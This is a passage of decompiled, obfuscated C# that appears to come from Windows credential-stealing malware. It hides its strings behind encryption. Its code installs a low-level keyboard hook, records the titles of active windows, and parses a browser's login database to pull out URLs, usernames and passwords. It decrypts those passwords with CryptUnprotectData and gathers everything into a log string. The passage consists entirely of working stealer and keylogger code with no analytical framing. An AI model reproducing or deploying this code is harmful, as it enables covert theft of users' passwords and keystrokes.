				text4 = (Class5.string_8 = Class16.smethod_57("VnF8g3VWcXyDdVZxjradi5V8g3VWcXyDdVZxfIN1Vi4=", "False") + Environment.NewLine + stringBuilder.ToString() + Environment.NewLine + Class16.smethod_57("WnWAh3ladYCHeVp1gId5WnWAh3ladYCHeVp1gId5WnUr", "False"));
				return result;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int int_0, Class9.Delegate0 delegate0_0, int int_1, int int_2);

	static string smethod_23(byte[] byte_0, byte[] byte_1)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				mD5CryptoServiceProvider.Initialize();
				byte[] array = new byte[Class10.Class11.byte_0.Length + (byte_0.Length - 1) + 1];
				Array.Copy(Class10.Class11.byte_0, array, Class10.Class11.byte_0.Length);
				Array.Copy(byte_0, 0, array, Class10.Class11.byte_0.Length, byte_0.Length);
				byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
				array = new byte[array2.Length + Class10.Class11.byte_0.Length + (byte_0.Length - 1) + 1];
				Array.Copy(array2, array, array2.Length);
				Array.Copy(Class10.Class11.byte_0, 0, array, array2.Length, Class10.Class11.byte_0.Length);
				Array.Copy(byte_0, 0, array, array2.Length + Class10.Class11.byte_0.Length, byte_0.Length);
				byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				byte[] array3 = new byte[24];
				byte[] array4 = new byte[8];
				Array.Copy(array2, array3, array2.Length);
				Array.Copy(sourceArray, 0, array3, array2.Length, 8);
				Array.Copy(sourceArray, 8, array4, 0, 8);
				byte_0 = array3;
				tripleDESCryptoServiceProvider.IV = array4;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				byte[] bytes = cryptoTransform.TransformFinalBlock(byte_1, 0, byte_1.Length);
				return Encoding.Unicode.GetString(bytes);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	static bool smethod_24(Class23.Class28 class28_0, Class23.Class25 class25_0)
	{
		while (true)
		{
			switch (class28_0.int_2)
			{
			case 5:
			{
				int int_ = Class23.Class28.int_1[class28_0.int_7];
				int num = Class16.smethod_63(class25_0, int_);
				if (num >= 0)
				{
					Class16.smethod_50(class25_0, int_);
					num += Class23.Class28.int_0[class28_0.int_7];
					while (num-- > 0)
					{
						class28_0.byte_1[class28_0.int_8++] = class28_0.byte_2;
					}
					if (class28_0.int_8 == class28_0.int_6)
					{
						return true;
					}
					goto IL_009b;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class16.smethod_60(class28_0.class27_0, class25_0)) & -16) == 0)
				{
					class28_0.byte_1[class28_0.int_8++] = (class28_0.byte_2 = (byte)num2);
					if (class28_0.int_8 == class28_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class28_0.byte_2 = 0;
					}
					class28_0.int_7 = num2 - 16;
					class28_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class28_0.int_8 < class28_0.int_5)
				{
					int num3 = Class16.smethod_63(class25_0, 3);
					if (num3 >= 0)
					{
						Class16.smethod_50(class25_0, 3);
						class28_0.byte_0[Class23.Class28.int_9[class28_0.int_8]] = (byte)num3;
						class28_0.int_8++;
						continue;
					}
					return false;
				}
				class28_0.class27_0 = new Class23.Class27(class28_0.byte_0);
				class28_0.byte_0 = null;
				class28_0.int_8 = 0;
				class28_0.int_2 = 4;
				goto case 4;
			case 2:
				class28_0.int_5 = Class16.smethod_63(class25_0, 4);
				if (class28_0.int_5 >= 0)
				{
					class28_0.int_5 += 4;
					Class16.smethod_50(class25_0, 4);
					class28_0.byte_0 = new byte[19];
					class28_0.int_8 = 0;
					class28_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class28_0.int_4 = Class16.smethod_63(class25_0, 5);
				if (class28_0.int_4 >= 0)
				{
					class28_0.int_4++;
					Class16.smethod_50(class25_0, 5);
					class28_0.int_6 = class28_0.int_3 + class28_0.int_4;
					class28_0.byte_1 = new byte[class28_0.int_6];
					class28_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class28_0.int_3 = Class16.smethod_63(class25_0, 5);
				if (class28_0.int_3 >= 0)
				{
					class28_0.int_3 += 257;
					Class16.smethod_50(class25_0, 5);
					class28_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_009b:
			class28_0.int_2 = 4;
		}
	}

	static void smethod_25(ref double double_0)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(double_0);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_26(Class23.Class25 class25_0)
	{
		return class25_0.int_0 == class25_0.int_1;
	}

	static ICryptoTransform smethod_27(byte[] byte_0, byte[] byte_1, Class21 class21_0, bool bool_0)
	{
		class21_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class21_0.object_0, new object[1] { byte_1 });
		class21_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class21_0.object_0, new object[1] { byte_0 });
		MethodInfo method = class21_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class21_0.object_0, new object[0]);
	}

	static bool smethod_28(ulong ulong_0)
	{
		checked
		{
			if (Class8.byte_0[(int)ulong_0] == 13)
			{
				ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(Class16.smethod_2(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
				int num2 = 0;
				if (Class8.struct3_0 != null)
				{
					num2 = Class8.struct3_0.Length;
					Class8.struct3_0 = (Class8.Struct3[])Utils.CopyArray((Array)Class8.struct3_0, (Array)new Class8.Struct3[Class8.struct3_0.Length + unchecked((int)num) + 1]);
				}
				else
				{
					Class8.struct3_0 = new Class8.Struct3[unchecked((int)num) + 1];
				}
				int num3 = num;
				Class8.Struct2[] array = default(Class8.Struct2[]);
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = Class16.smethod_2(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(8L)), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(ulong_0), new decimal(100L)) != 0)
					{
						num4 += ulong_0;
					}
					int num5 = Class16.smethod_56((int)num4);
					Class16.smethod_45(num5, (int)num4);
					int num6 = Class16.smethod_56(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					Class8.struct3_0[num2 + i].long_0 = Class16.smethod_45(num6, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = Class16.smethod_56((int)num4);
					num6 = num5;
					long num7 = Class16.smethod_45(num5, (int)num4);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (Class8.Struct2[])Utils.CopyArray((Array)array, (Array)new Class8.Struct2[num9 + 1]);
						num5 = num6 + 1;
						num6 = Class16.smethod_56(num5);
						array[num9].long_1 = Class16.smethod_45(num6, num5);
						if (array[num9].long_1 > 9L)
						{
							if (Class16.smethod_14(array[num9].long_1))
							{
								array[num9].long_0 = (long)Math.Round((double)(array[num9].long_1 - 13L) / 2.0);
							}
							else
							{
								array[num9].long_0 = (long)Math.Round((double)(array[num9].long_1 - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].long_0 = Class8.byte_1[(int)array[num9].long_1];
						}
						num8 = num8 + (num6 - num5) + 1L;
						num9++;
					}
					Class8.struct3_0[num2 + i].string_0 = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].long_1 > 9L)
						{
							if (!Class16.smethod_14(array[j].long_1))
							{
								if (decimal.Compare(new decimal(Class8.ulong_0), 1m) == 0)
								{
									Class8.struct3_0[num2 + i].string_0[j] = Encoding.Default.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
								}
								else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(2L)) == 0)
								{
									Class8.struct3_0[num2 + i].string_0[j] = Encoding.Unicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
								}
								else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(3L)) == 0)
								{
									Class8.struct3_0[num2 + i].string_0[j] = Encoding.BigEndianUnicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
								}
							}
							else
							{
								Class8.struct3_0[num2 + i].string_0[j] = Encoding.Default.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0);
							}
						}
						else
						{
							Class8.struct3_0[num2 + i].string_0[j] = Conversions.ToString(Class16.smethod_2(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].long_0));
						}
						num10 = (int)(num10 + array[j].long_0);
					}
				}
			}
			else if (Class8.byte_0[(int)ulong_0] == 5)
			{
				ushort num12 = Convert.ToUInt16(decimal.Subtract(new decimal(Class16.smethod_2(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
				int num13 = num12;
				for (int k = 0; k <= num13; k++)
				{
					ushort num14 = (ushort)Class16.smethod_2(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(12L)), new decimal(k * 2))), 2);
					Class16.smethod_28(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class16.smethod_2((int)(ulong_0 + num14), 4)), 1m), new decimal(Class8.ushort_0))));
				}
				Class16.smethod_28(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class16.smethod_2(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(8L))), 4)), 1m), new decimal(Class8.ushort_0))));
			}
			return true;
		}
	}

	static bool smethod_29(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_30(byte[] byte_0, Class23.Class27 class27_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				int[] array3;
				int[] array4 = (array3 = array);
				nint num2 = num;
				array4[num] = array3[num2] + 1;
			}
		}
		int num3 = 0;
		int num4 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num3;
			num3 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num5 = array2[j] & 0x1FF80;
				int num6 = num3 & 0x1FF80;
				num4 += num6 - num5 >> 16 - j;
			}
		}
		class27_0.short_0 = new short[num4];
		int num7 = 512;
		for (int num8 = 15; num8 >= 10; num8--)
		{
			int num9 = num3 & 0x1FF80;
			num3 -= array[num8] << 16 - num8;
			int num10 = num3 & 0x1FF80;
			for (int k = num10; k < num9; k += 128)
			{
				class27_0.short_0[Class16.smethod_38(k)] = (short)((-num7 << 4) | num8);
				num7 += 1 << num8 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num11 = byte_0[l];
			if (num11 == 0)
			{
				continue;
			}
			num3 = array2[num11];
			int num12 = Class16.smethod_38(num3);
			if (num11 <= 9)
			{
				do
				{
					class27_0.short_0[num12] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < 512);
			}
			else
			{
				int num13 = class27_0.short_0[num12 & 0x1FF];
				int num14 = 1 << (num13 & 0xF);
				num13 = -(num13 >> 4);
				do
				{
					class27_0.short_0[num13 | (num12 >> 9)] = (short)((l << 4) | num11);
					num12 += 1 << num11;
				}
				while (num12 < num14);
			}
			array2[num11] = num3 + (1 << 16 - num11);
		}
	}

	static void smethod_31(int int_0, Class23.Class25 class25_0, byte[] byte_0, int int_1)
	{
		if (class25_0.int_0 < class25_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
				class25_0.uint_0 |= (uint)((byte_0[int_0++] & 0xFF) << class25_0.int_2);
				class25_0.int_2 += 8;
			}
			class25_0.byte_0 = byte_0;
			class25_0.int_0 = int_0;
			class25_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static ICryptoTransform smethod_32(byte[] byte_0, Class22 class22_0, bool bool_0, byte[] byte_1)
	{
		class22_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class22_0.object_0, new object[1] { byte_0 });
		class22_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class22_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class22_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class22_0.object_0, new object[0]);
	}

	static void smethod_33(Class23.Class26 class26_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class26_0.byte_0[class26_0.int_0++] = class26_0.byte_0[int_0++];
			class26_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static int smethod_34(Class23.Class25 class25_0)
	{
		return class25_0.int_2;
	}

	static void smethod_35(Class23.Class26 class26_0, int int_0, int int_1)
	{
		if ((class26_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class26_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class26_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class26_0.byte_0, num, class26_0.byte_0, class26_0.int_0, int_0);
				class26_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class26_0.byte_0[class26_0.int_0++] = class26_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class16.smethod_33(class26_0, num, int_0, int_1);
		}
	}

	static void smethod_36()
	{
		try
		{
			Class9.delegate0_0 = Class16.smethod_6;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Class9.intptr_0 = (IntPtr)Class16.SetWindowsHookExA(13, Class9.delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_37(byte[] byte_0)
	{
		Class7.Struct1 struct1_ = default(Class7.Struct1);
		Class7.Struct1 struct1_2 = default(Class7.Struct1);
		GCHandle gCHandle = GCHandle.Alloc(byte_0, GCHandleType.Pinned);
		struct1_.intptr_0 = gCHandle.AddrOfPinnedObject();
		struct1_.int_0 = byte_0.Length;
		gCHandle.Free();
		Class7.Struct1 @struct = default(Class7.Struct1);
		Class7.Struct1 struct1_3 = @struct;
		Class7.Struct0 struct2 = default(Class7.Struct0);
		Class7.Struct0 struct0_ = struct2;
		IntPtr intptr_ = default(IntPtr);
		Class16.CryptUnprotectData(ref struct1_, (string)null, ref struct1_3, intptr_, ref struct0_, 0, ref struct1_2);
		checked
		{
			byte[] array = new byte[struct1_2.int_0 + 1];
			Marshal.Copy(struct1_2.intptr_0, array, 0, struct1_2.int_0);
			string @string = Encoding.Default.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	static short smethod_38(int int_0)
	{
		return (short)((Class23.Class29.byte_0[int_0 & 0xF] << 12) | (Class23.Class29.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class23.Class29.byte_0[(int_0 >> 8) & 0xF] << 4) | Class23.Class29.byte_0[int_0 >> 12]);
	}

	static string smethod_39(int int_0, string string_0)
	{
		int num = -1;
		int num2 = Class8.string_0.Length;
		for (int i = 0; i <= num2; i = checked(i + 1))
		{
			if (Class8.string_0[i].ToLower().CompareTo(string_0.ToLower()) == 0)
			{
				num = i;
				break;
			}
		}
		if (num == -1)
		{
			return null;
		}
		return Class16.smethod_51(int_0, num);
	}

	static int smethod_40(int int_0, int int_1, Class23.Class26 class26_0, byte[] byte_0)
	{
		int num = class26_0.int_0;
		if (int_0 > class26_0.int_1)
		{
			int_0 = class26_0.int_1;
		}
		else
		{
			num = (class26_0.int_0 - class26_0.int_1 + int_0) & 0x7FFF;
		}
		int num2 = int_0;
		int num3 = int_0 - num;
		if (num3 > 0)
		{
			Array.Copy(class26_0.byte_0, 32768 - num3, byte_0, int_1, num3);
			int_1 += num3;
			int_0 = num;
		}
		Array.Copy(class26_0.byte_0, num - int_0, byte_0, int_1, int_0);
		class26_0.int_1 -= num2;
		if (class26_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static int smethod_41(Class23.Class26 class26_0, Class23.Class25 class25_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class26_0.int_1), Class16.smethod_11(class25_0));
		int num = 32768 - class26_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class16.smethod_49(class25_0, class26_0.byte_0, class26_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class16.smethod_49(class25_0, class26_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class16.smethod_49(class25_0, class26_0.byte_0, class26_0.int_0, int_0);
		}
		class26_0.int_0 = (class26_0.int_0 + num2) & 0x7FFF;
		class26_0.int_1 += num2;
		return num2;
	}

	static void smethod_42(Class21 class21_0)
	{
		class21_0.type_0.GetMethod("Clear")!.Invoke(class21_0.object_0, new object[0]);
	}

	static void smethod_43()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class16.smethod_57("jZPGzbedsbOhuKO7xMOshr+80HB1rcu/rHWxvb/FncCzqr+YtcV+lJLAuBg=", "False");
		checked
		{
			try
			{
				new Class8(text);
				Class16.smethod_18(Class16.smethod_57("l7W4wbieHA==", "False"));
				if (!File.Exists(text))
				{
					return;
				}
				int num = Class16.smethod_61() - 1;
				for (int i = 0; i <= num; i++)
				{
					string text2 = Class16.smethod_39(i, Class16.smethod_57("jautsqaMmLm9qSg=", "False"));
					string text3 = Class16.smethod_39(i, Class16.smethod_57("nre0yLaKsbS1voqwxLsh", "False"));
					string text4 = Class16.smethod_37(Encoding.Default.GetBytes(Class16.smethod_39(i, Class16.smethod_57("oa3K0cegvru9xpK4zMMZ", "False"))));
					if ((Operators.CompareString(text3, "", false) != 0) & (Operators.CompareString(text4, "", false) != 0))
					{
						Class7.string_0 = Class16.smethod_57("gZynrqCBnKeuoIGcrdnVs8zPrqCBnKeuoIGcp66ggZwE", "False") + "\r\n" + Class16.smethod_57("fL7N1Y1UEw==", "False") + text2 + "\r\n" + Class16.smethod_57("eLGuwrCEq66KYiM=", "False") + text3 + "\r\n" + Class16.smethod_57("eqbDysCZt7SRaRw=", "False") + text4 + "\r\n" + Class16.smethod_57("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZQg", "False") + "\r\n ";
						Class5.string_0 += Class7.string_0;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	static void smethod_44(Class8 class8_0, ulong ulong_0)
	{
		checked
		{
			if (Class8.byte_0[(int)ulong_0] == 13)
			{
				ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(Class16.smethod_2(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
				int num2 = 0;
				if (Class8.struct4_0 != null)
				{
					num2 = Class8.struct4_0.Length;
					Class8.struct4_0 = (Class8.Struct4[])Utils.CopyArray((Array)Class8.struct4_0, (Array)new Class8.Struct4[Class8.struct4_0.Length + unchecked((int)num) + 1]);
				}
				else
				{
					Class8.struct4_0 = new Class8.Struct4[unchecked((int)num) + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = Class16.smethod_2(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(8L)), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(ulong_0), new decimal(100L)) != 0)
					{
						num4 += ulong_0;
					}
					int num5 = Class16.smethod_56((int)num4);
					Class16.smethod_45(num5, (int)num4);
					int num6 = Class16.smethod_56(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					Class8.struct4_0[num2 + i].long_0 = Class16.smethod_45(num6, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = Class16.smethod_56((int)num4);
					num6 = num5;
					long value = Class16.smethod_45(num5, (int)num4);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = Class16.smethod_56(num5);
						array[num7] = Class16.smethod_45(num6, num5);
						if (array[num7] <= 9L)
						{
							array[num7] = Class8.byte_1[(int)array[num7]];
						}
						else if (Class16.smethod_14(array[num7]))
						{
							array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
						}
						else
						{
							array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
						}
						num7++;
					}
					while (num7 <= 4);
					if (decimal.Compare(new decimal(Class8.ulong_0), 1m) == 0)
					{
						Class8.struct4_0[num2 + i].string_0 = Encoding.Default.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(2L)) == 0)
					{
						Class8.struct4_0[num2 + i].string_0 = Encoding.Unicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(3L)) == 0)
					{
						Class8.struct4_0[num2 + i].string_0 = Encoding.BigEndianUnicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					if (decimal.Compare(new decimal(Class8.ulong_0), 1m) == 0)
					{
						Class8.struct4_0[num2 + i].string_1 = Encoding.Default.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(2L)) == 0)
					{
						Class8.struct4_0[num2 + i].string_1 = Encoding.Unicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(3L)) == 0)
					{
						Class8.struct4_0[num2 + i].string_1 = Encoding.BigEndianUnicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					Class8.struct4_0[num2 + i].long_1 = (long)Class16.smethod_2(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					if (decimal.Compare(new decimal(Class8.ulong_0), 1m) == 0)
					{
						Class8.struct4_0[num2 + i].string_3 = Encoding.Default.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(2L)) == 0)
					{
						Class8.struct4_0[num2 + i].string_3 = Encoding.Unicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(Class8.ulong_0), new decimal(3L)) == 0)
					{
						Class8.struct4_0[num2 + i].string_3 = Encoding.BigEndianUnicode.GetString(Class8.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
				}
			}
			else
			{
				if (Class8.byte_0[(int)ulong_0] != 5)
				{
					return;
				}
				ushort num8 = Convert.ToUInt16(decimal.Subtract(new decimal(Class16.smethod_2(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
				int num9 = num8;
				for (int j = 0; j <= num9; j++)
				{
					ushort num10 = (ushort)Class16.smethod_2(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(12L)), new decimal(j * 2))), 2);
					if (decimal.Compare(new decimal(ulong_0), new decimal(100L)) == 0)
					{
						Class16.smethod_44(class8_0, Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class16.smethod_2(unchecked((int)num10), 4)), 1m), new decimal(Class8.ushort_0))));
					}
					else
					{
						Class16.smethod_44(class8_0, Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class16.smethod_2((int)(ulong_0 + num10), 4)), 1m), new decimal(Class8.ushort_0))));
					}
				}
				Class16.smethod_44(class8_0, Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(Class16.smethod_2(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(8L))), 4)), 1m), new decimal(Class8.ushort_0))));
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int int_0, StringBuilder stringBuilder_0, int int_1);

	[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern bool CryptUnprotectData(ref Class7.Struct1 struct1_0, string string_0, ref Class7.Struct1 struct1_1, IntPtr intptr_0, ref Class7.Struct0 struct0_0, int int_0, ref Class7.Struct1 struct1_2);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern int GetWindowTextLength(IntPtr intptr_0);

	static long smethod_45(int int_0, int int_1)
	{
		checked
		{
			int_0++;
			byte[] array = new byte[8];
			int num = int_0 - int_1;
			bool flag = false;
			if (unchecked(num == 0 || num > 9))
			{
				return 0L;
			}
			switch (num)
			{
			case 1:
				array[0] = (byte)(Class8.byte_0[int_1] & 0x7F);
				return BitConverter.ToInt64(array, 0);
			case 9:
				flag = true;
				break;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = Class8.byte_0[int_0 - 1];
				int_0--;
				num4 = 1;
			}
			for (int i = int_0 - 1; i >= int_1; i += -1)
			{
				if (i - 1 >= int_1)
				{
					array[num4] = (byte)unchecked(((byte)((uint)Class8.byte_0[i] >> (checked(num2 - 1) & 7)) & (255 >> num2)) | (byte)(Class8.byte_0[checked(i - 1)] << (num3 & 7)));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)(unchecked((byte)((uint)Class8.byte_0[i] >> (checked(num2 - 1) & 7))) & (255 >> num2));
				}
			}
			return BitConverter.ToInt64(array, 0);
		}
	}

	static string smethod_46(IntPtr intptr_0)
	{
		string result = default(string);
		try
		{
			if (intptr_0.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = Class16.GetWindowTextLength(intptr_0);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			Class16.GetWindowTextA((int)intptr_0, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static void smethod_47(Class23.Class26 class26_0, int int_0)
	{
		if (class26_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class26_0.byte_0[class26_0.int_0++] = (byte)int_0;
		class26_0.int_0 &= 32767;
	}

	static void smethod_48()
	{
		checked
		{
			try
			{
